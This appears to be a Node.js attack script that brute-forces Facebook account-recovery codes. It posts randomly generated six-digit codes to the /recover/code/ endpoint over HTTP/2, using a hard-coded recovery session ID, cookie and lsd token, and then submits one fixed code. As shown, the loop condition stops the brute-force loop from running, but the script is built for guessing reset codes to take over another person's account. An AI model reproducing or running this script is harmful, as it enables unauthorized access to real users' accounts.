'use strict';

const log = console.log.bind(console);
const Http2Client = require('./http2-client');
const helpers = require('./helpers');
const child_process = require('node:child_process');
const fs = require('node:fs');

const { rand } = helpers;

const httpClient = new Http2Client(false);

const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';

(async () => {
  const url = 'https://www.facebook.com/recover/code/?cuid=AYj1DMVv78ofwVBASUzqbgGOwC5c1_EJRiQiFEqu_wc7T4d9032kEx4idnTiRNc4U0WsiSG6WKRisSkq-SMydeaB3AcE3QGdaMMaCnJC8qCwtLCRamA5hfDuCAeTlMPDoWHm4d4VSS9ztSvvR_ulwitT5LtNDxFo64YVqALnLb9AzZya-S9YAf9U_D_WZqRFcmQ_Ge_07GFoWjxCQ7PdL0goMtVo3Q8IgAMkhfOO6M1r2rIYfZw5Qa-hNORllt3IZfXUEOIuZPNXw7x02qsffHptWGtIoo8UPhK9YW29yKb1EA';
  const headers = {
    'Cookie': 'datr=F_YuaFQVmcfePVvsUJJtDvkK',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': USER_AGENT,
    'Sec-Fetch-Site': 'same-origin'
  };
  // const codes = require('./codes');

  // child_process.exec('siren warn');

  // const lsd = helpers.randomString(11);
  const lsd = 'AVpc27UCzBs';
  log(lsd);
  const p = [];
  for (let i = 0, code; 0 > i; ++i) {
    code = rand(111111, 999999);
    p.push(new Promise(r => httpClient.post(url, headers, 'lsd='+lsd+'&n='+code).then(res => (log(res.statusCode), r()))));
  }

  Promise.all(p).then(() => {
    log('end');
    httpClient.post(url, headers, 'lsd='+lsd+'&n=896475').then(res => log(res.statusCode));
  });
})();